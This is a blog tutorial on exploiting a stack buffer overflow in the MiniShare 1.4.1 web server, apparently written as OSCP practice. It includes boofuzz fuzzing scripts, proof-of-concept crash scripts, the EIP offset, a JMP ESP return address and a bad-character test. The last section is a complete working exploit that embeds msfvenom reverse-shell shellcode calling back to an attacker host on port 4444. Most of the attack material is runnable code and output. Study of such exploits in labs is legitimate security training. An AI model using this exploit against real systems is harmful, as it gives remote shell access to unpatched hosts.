---
title: MiniShare 1.4.1 webserver buffer overflow exploit
author: Stipe Marinovic
date: 2020-07-15 23:00:00 +0800
categories: [Blogging, Tutorial, Exploit]
tags: [fuzzing, shellcoding, exploit, bufferoverflow, bof]
toc: true
---

## Introduction ##

MiniShare is a minimal web server with a simple GUI meant for fast and simple file sharing. It was released back in a days of Windows XP. Application has a buffer overflow vulnerability which is easy to detect and exploit. That feature makes it a  great candidate for OSCP BoF practice.  Application can be downloaded from: [https://sourceforge.net/projects/minishare/](https://sourceforge.net/projects/minishare/). 


## Fuzzing ##

Fuzzers are applications used to create various payloads based on user defined template. In order to create template, first we need to capture traffic. If it is a binary protocol we would could use tool such as Wireshark to capture traffic but since this is HTTP traffic we can use proxy such as Burp to capture traffic as show on following screenshot.

![Fuzzing results](https://github.com/smarinovic/smarinovic.github.io/blob/master/assets/img/minishare_01.png?raw=true)


Based on the following captured traffic:
   
```
   GET / HTTP/1.1
   Host: 172.16.24.212
   User-Agent: Mozilla/5.0 (X11; Linux i686; rv:68.0) Gecko/20100101 Firefox/68.0
   Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
   Accept-Language: en-US,en;q=0.5
   Accept-Encoding: gzip, deflate
   Connection: close
   Upgrade-Insecure-Requests: 1
```

we can create template for fuzzer:

```
#!/usr/bin/python
import sys
from boofuzz import *

host = '172.16.24.212'
port = 80
temp = " "

def main():

   session = Session(target = Target(connection = SocketConnection(host, port, proto='tcp')))

   s_initialize("MiniShare GET")
   s_string("GET", fuzzable = False)
   s_delim(" ", fuzzable = False)
   s_string("/", fuzzable = False)
   s_string("FUZZ", fuzzable = True)
   s_delim(" ", fuzzable = False)
   s_string("HTTP/1.1", fuzzable = False)
   s_string("\r\n", fuzzable = False)

   s_string("Host:", fuzzable =False)
   s_delim(" ", fuzzable = False)
   s_string("172.16.24.212", fuzzable = Ture)
   s_string("\r\n", fuzzable = False)

   s_string("User-Agent", fuzzable =False)
   s_delim(" ", fuzzable = False)
   s_string("FUZZ", fuzzable = True)
   s_string("\r\n", fuzzable = False)

   s_string("Accept:", fuzzable =False)
   s_delim(" ", fuzzable = False)
   s_string("FUZZ", fuzzable = True)
   s_string("\r\n", fuzzable = False)

   s_static("Connection: close\r\n")

   session.connect(s_get("MiniShare GET"))
   session.fuzz()

if __name__ == "__main__":
    main()
```

Our fuzzer managed to crash application but fuzzer keeps going so it is not easy to determine which payload has crashed the application.

![Fuzzing results](https://github.com/smarinovic/smarinovic.github.io/blob/master/assets/img/minishare_02.png?raw=true)


In order to find which payload has crashed application we can update boofuzz with post_test_case_callbacks function call:

```
#!/usr/bin/python
import sys
from boofuzz import *

host = '172.16.24.212'
port = 80

def receive_response(target, fuzz_data_logger, session, sock):
   data=sock.recv(20000)
   if not "HTTP/1.1" in data:
      print "\n######################################################\n"
      print "[+] No data received from MiniShare server"
      print "[+] Payload length: " + str (len(session.last_send))
      print "[+] Payload saved in miniserver_crash_report.txt"
      print "[+] Fuzzing ended"
      print "\n######################################################\n"
      f = open("miniserver_crash_report.txt", "w")
      f.write(session.last_send)
      f.close()
      sys.exit(-1)


def main():

   session = Session(post_test_case_callbacks=[receive_response], sleep_time=2, target = Target(connection = SocketConnection(host, port, proto='tcp')))

   s_initialize("MiniShare GET")
   s_string("GET", fuzzable = False)
   s_delim(" ", fuzzable = False)
   s_string("/", fuzzable = False)
   s_string("FUZZ", fuzzable = True)
   s_delim(" ", fuzzable = False)
   s_string("HTTP/1.1", fuzzable = False)
   s_string("\r\n", fuzzable = False)

   s_string("Host:", fuzzable =False)
   s_delim(" ", fuzzable = False)
   s_string("172.16.24.212", fuzzable = False)
   s_string("\r\n", fuzzable = False)

   s_string("User-Agent", fuzzable =False)
   s_delim(" ", fuzzable = False)
   s_string("FUZZ", fuzzable = False)
   s_string("\r\n", fuzzable = False)

   s_string("Accept:", fuzzable =False)
   s_delim(" ", fuzzable = False)
   s_string("FUZZ", fuzzable = False)
   s_string("\r\n", fuzzable = False)

   s_static("Connection: close\r\n")
   s_string("\r\n", fuzzable = False)

   session.connect(s_get("MiniShare GET"))
   session.fuzz()

if __name__ == "__main__":
    main()
```

Now when application is crashed, boofuzz stops automatically and saves payload to a defined file: miniserver_crash_report.txt

![Fuzzing results](https://github.com/smarinovic/smarinovic.github.io/blob/master/assets/img/minishare_03.png?raw=true)


## Resulting Payload ##

```
cat miniserver_crash_report.txt 
GET //.:/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA HTTP/1.1
Host: 172.16.24.213
User-Agent FUZZ
Accept: FUZZ
Connection: close
```

## Building proof of concept exploit code ##

One note, it is not enough just to send GET + 5000 A's, in order for crash to happen we need to send other headers and ```\r\n``` too. So following proof of concept code works:

```
#!/usr/bin/python

import socket

host = "172.16.24.213"
port = 80

buffer = "GET //.:/" + (5095-9) * "A" + " HTTP/1.1\r\n"
buffer += "Host: 172.16.24.212\r\nUser-Agent FUZZ\r\nAccept: FUZZ\r\nConnection: close\r\n\r\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
s.send(buffer)
print ("[+] Payload sent")
s.close()
```

Application has crashed and EIP is overwritten with four ```\x41``` which equals to "AAAA".

![Fuzzing results](https://github.com/smarinovic/smarinovic.github.io/blob/master/assets/img/minishare_04.png?raw=true)


![Fuzzing results](https://github.com/smarinovic/smarinovic.github.io/blob/master/assets/img/minishare_05.png?raw=true)


![Fuzzing results](https://github.com/smarinovic/smarinovic.github.io/blob/master/assets/img/minishare_06.png?raw=true)


Great, next we need to find out location of EIP register in payload.

![Fuzzing results](https://github.com/smarinovic/smarinovic.github.io/blob/master/assets/img/minishare_07.png?raw=true)


```
/usr/bin/msf-pattern_offset -l 5095 -q 43346843
[*] Exact match at offset 1782
```

Updated PoC to confirm EIP location:

```
#!/usr/bin/python

import socket

host = "172.16.24.213"
port = 80

buffer = "GET //.:/" + 1782 * "A" + "B" * 4 + (5095-9-1782-4) * "C"

buffer += " HTTP/1.1\r\n"
buffer += "Host: 172.16.24.212\r\nUser-Agent FUZZ\r\nAccept: FUZZ\r\nConnection: close\r\n\r\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
s.send(buffer)
print ("[+] Payload sent")
s.close()
```

Result:

![Fuzzing results](https://github.com/smarinovic/smarinovic.github.io/blob/master/assets/img/minishare_08.png?raw=true)


We can use mona to find address with JMP ESP instruction: ```!mona findwild -s "JMP ESP"```

One of the addresses suggested by mona is: ```JMP ESP 0x7e429353```

which we need to reverse and write in little endian format for it to be placed correctly in memory:
jmp_esp ="\x53\x93\x42\x7e"


## Finding bed characters ##

As next step we need to find bad characters. Bad characters are all characters which breaks an exploit. Most well known one is "\x00" (null byte) as null byte is used to terminate string in C program language. In order to find other bad characters we need to send all characters as payload and observe behavior. If payload didn't crash application that means that we have bad character in our payload. To narrow down location of our bad character we can send 10 characters at a time until we find a set or characters containing bad character and then send one by one character form that set until we find which character is bad. We need to repeat this steps until every bad character is found. 

Eventually we will find following chars as bad: ```\x00\x0d```.

* Script for testing bad characters is following:  
	
```
#!/usr/bin/python

import socket

host = "172.16.24.213"
port = 80

#JMP ESP 0x7e429353
jmp_esp ="\x53\x93\x42\x7e" 

badchars = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

buffer = "GET //.:/" + badchars + (1782-len(badchars)) * "\x90" + jmp_esp + (5095-9-1782-4) * "C"

buffer += " HTTP/1.1\r\n"
buffer += "Host: 172.16.24.212\r\nUser-Agent FUZZ\r\nAccept: FUZZ\r\nConnection: close\r\n\r\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
s.send(buffer)
print ("[+] Payload sent")
s.close()
```


## Final exploit ##

```
#!/usr/bin/python
import socket
host = "172.16.24.213"
port = 80

#JMP ESP 0x7e429353
jmp_esp ="\x53\x93\x42\x7e"
 
# badchars: \x00 i \x0d
"""
msfvenom -p windows/shell_reverse_tcp LHOST=172.16.24.204 LPORT=4444 -b "\x00\x0d" -f python
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of python file: 1712 bytes
"""
buf = b""
buf += b"\xba\x96\x17\x2e\x37\xd9\xc6\xd9\x74\x24\xf4\x5b\x31"
buf += b"\xc9\xb1\x52\x31\x53\x12\x03\x53\x12\x83\x7d\xeb\xcc"
buf += b"\xc2\x7d\xfc\x93\x2d\x7d\xfd\xf3\xa4\x98\xcc\x33\xd2"
buf += b"\xe9\x7f\x84\x90\xbf\x73\x6f\xf4\x2b\x07\x1d\xd1\x5c"
buf += b"\xa0\xa8\x07\x53\x31\x80\x74\xf2\xb1\xdb\xa8\xd4\x88"
buf += b"\x13\xbd\x15\xcc\x4e\x4c\x47\x85\x05\xe3\x77\xa2\x50"
buf += b"\x38\xfc\xf8\x75\x38\xe1\x49\x77\x69\xb4\xc2\x2e\xa9"
buf += b"\x37\x06\x5b\xe0\x2f\x4b\x66\xba\xc4\xbf\x1c\x3d\x0c"
buf += b"\x8e\xdd\x92\x71\x3e\x2c\xea\xb6\xf9\xcf\x99\xce\xf9"
buf += b"\x72\x9a\x15\x83\xa8\x2f\x8d\x23\x3a\x97\x69\xd5\xef"
buf += b"\x4e\xfa\xd9\x44\x04\xa4\xfd\x5b\xc9\xdf\xfa\xd0\xec"
buf += b"\x0f\x8b\xa3\xca\x8b\xd7\x70\x72\x8a\xbd\xd7\x8b\xcc"
buf += b"\x1d\x87\x29\x87\xb0\xdc\x43\xca\xdc\x11\x6e\xf4\x1c"
buf += b"\x3e\xf9\x87\x2e\xe1\x51\x0f\x03\x6a\x7c\xc8\x64\x41"
buf += b"\x38\x46\x9b\x6a\x39\x4f\x58\x3e\x69\xe7\x49\x3f\xe2"
buf += b"\xf7\x76\xea\xa5\xa7\xd8\x45\x06\x17\x99\x35\xee\x7d"
buf += b"\x16\x69\x0e\x7e\xfc\x02\xa5\x85\x97\x80\x2a\x9d\xab"
buf += b"\xb1\x48\x9d\x22\x1e\xc4\x7b\x2e\x8e\x80\xd4\xc7\x37"
buf += b"\x89\xae\x76\xb7\x07\xcb\xb9\x33\xa4\x2c\x77\xb4\xc1"
buf += b"\x3e\xe0\x34\x9c\x1c\xa7\x4b\x0a\x08\x2b\xd9\xd1\xc8"
buf += b"\x22\xc2\x4d\x9f\x63\x34\x84\x75\x9e\x6f\x3e\x6b\x63"
buf += b"\xe9\x79\x2f\xb8\xca\x84\xae\x4d\x76\xa3\xa0\x8b\x77"
buf += b"\xef\x94\x43\x2e\xb9\x42\x22\x98\x0b\x3c\xfc\x77\xc2"
buf += b"\xa8\x79\xb4\xd5\xae\x85\x91\xa3\x4e\x37\x4c\xf2\x71"
buf += b"\xf8\x18\xf2\x0a\xe4\xb8\xfd\xc1\xac\xc9\xb7\x4b\x84"
buf += b"\x41\x1e\x1e\x94\x0f\xa1\xf5\xdb\x29\x22\xff\xa3\xcd"
buf += b"\x3a\x8a\xa6\x8a\xfc\x67\xdb\x83\x68\x87\x48\xa3\xb8"

buffer = "GET //.:/" + (1782) * "\x90" + jmp_esp + 20 * "\x90" + buf + (5095-9-1782-4 -len(buf)) * "C"
buffer += " HTTP/1.1\r\n"
buffer += "Host: 172.16.24.212\r\nUser-Agent FUZZ\r\nAccept: FUZZ\r\nConnection: close\r\n\r\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
s.send(buffer)
print ("[+] Payload sent")
s.close()
```

![Fuzzing results](https://github.com/smarinovic/smarinovic.github.io/blob/master/assets/img/minishare_09.png?raw=true)


